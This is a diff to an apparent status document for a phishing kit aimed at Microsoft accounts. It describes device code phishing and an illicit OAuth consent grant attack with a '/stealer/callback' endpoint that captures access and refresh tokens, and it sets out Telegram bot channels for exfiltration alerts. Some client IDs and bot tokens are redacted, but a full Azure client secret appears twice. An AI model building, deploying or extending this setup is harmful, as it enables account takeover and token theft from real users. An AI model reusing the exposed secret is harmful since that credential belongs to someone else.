@@ -13,7 +13,7 @@
 ### 1. Device Code Phishing
 - **Status**: ✅ CODE COMPLETE (❌ DEPLOYMENT FAILED)
 - **Endpoint**: `/secure-access`
-- **Client ID**: `14d82eec-204b-4c2f-b7e8-296a70dab67e` (Microsoft Graph CLI)
+- **Client ID**: `[REDACTED]` (Microsoft Graph CLI)
 - **Capabilities**:
   - Captures access tokens
   - Captures refresh tokens (✅ IMPLEMENTED)
@@ -26,7 +26,7 @@
 ### 2. OAuth Consent Grant Attack (Illicit Consent Grant)
 - **Status**: ✅ CODE COMPLETE (❌ DEPLOYMENT FAILED)
 - **Endpoint**: `/microsoft-training` + `/stealer/callback`
-- **Client ID**: `f840d591-c00e-4aa0-8ebe-77b5f34b81e1` (User-registered app)
+- **Client ID**: `[REDACTED]` (User-registered app)
 - **Client Secret**: `DVd8Q~d22sfagk12YCUETKU1x5OS8-s~Mt92_bXa`
 - **Capabilities**:
   - Immediate token exchange (optimized for speed)
@@ -78,9 +78,9 @@
 ## 📱 TELEGRAM INTEGRATION
 
 ### Dual Bot Configuration
-- **Primary Bot**: `7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps`
+- **Primary Bot**: `7768080373:[REDACTED]`
 - **Chat ID**: `6743632244`
-- **Secondary Bot**: `7942871168:AAFuvCQXQJhYKipqGpr1G4IhUDABTGWF_9U`
+- **Secondary Bot**: `7942871168:[REDACTED]`
 - **Chat ID**: `6263177378`
 
 ### Notification Types
@@ -132,7 +132,7 @@
 FUNCTIONS_WORKER_RUNTIME=node
 FUNCTIONS_EXTENSION_VERSION=~4
 WEBSITE_NODE_DEFAULT_VERSION=~20
-FUNCTIONS_NODE_BLOCK_ON_ENTRY_POINT_ERROR=true
+[REDACTED]=true
 AZURE_CLIENT_SECRET=DVd8Q~d22sfagk12YCUETKU1x5OS8-s~Mt92_bXa
 ```
 
@@ -144,11 +144,11 @@ AZURE_CLIENT_SECRET=DVd8Q~d22sfagk12YCUETKU1x5OS8-s~Mt92_bXa
 ```
 
 ### Client IDs Used
-- **Azure CLI**: `04b07795-8ddb-461a-bbee-02f9e1bf7b46`
-- **PowerShell**: `1950a258-227b-4e31-a9cf-717495945fc2`
-- **Visual Studio**: `872cd9fa-d31f-45e0-9eab-6e460a02d1f1`
-- **Microsoft Graph CLI**: `14d82eec-204b-4c2f-b7e8-296a70dab67e` ✅ FINAL CHOICE
-- **User App**: `f840d591-c00e-4aa0-8ebe-77b5f34b81e1` ✅ WITH SECRET
+- **Azure CLI**: `[REDACTED]`
+- **PowerShell**: `[REDACTED]`
+- **Visual Studio**: `[REDACTED]`
+- **Microsoft Graph CLI**: `[REDACTED]` ✅ FINAL CHOICE
+- **User App**: `[REDACTED]` ✅ WITH SECRET
 
 ---
 
